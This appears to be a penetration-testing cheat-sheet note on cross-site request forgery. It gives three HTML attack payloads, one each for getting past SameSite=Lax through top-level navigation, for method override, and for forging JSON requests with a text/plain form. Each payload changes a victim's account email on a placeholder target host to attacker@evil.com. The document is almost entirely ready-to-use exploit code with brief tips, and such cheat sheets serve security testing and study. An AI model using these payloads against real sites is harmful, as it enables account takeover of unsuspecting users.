---
tags:
  - Exploitation
  - Foundational
  - HTTP
  - Initial_Access
  - Web_Application
---

### SameSite Lax Bypass
> [!info] **SameSite=Lax** allows GET requests from top-level navigation.

```html
<script>
  location = 'https://<TargetHost>/change-email?email=attacker@evil.com';
</script>
```

#### Method Override [alternative]
> Some frameworks support method override headers.

```html
<form action="https://<TargetHost>/change-email?_method=POST" method="GET">
  <input type="hidden" name="email" value="attacker@evil.com" />
</form>
```

### JSON CSRF
> [!tip] Try changing **Content-Type** or using form encoding for JSON endpoints.

```html
<form action="https://<TargetHost>/api/change-email" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","padding":"' value='"}' />
</form>
```
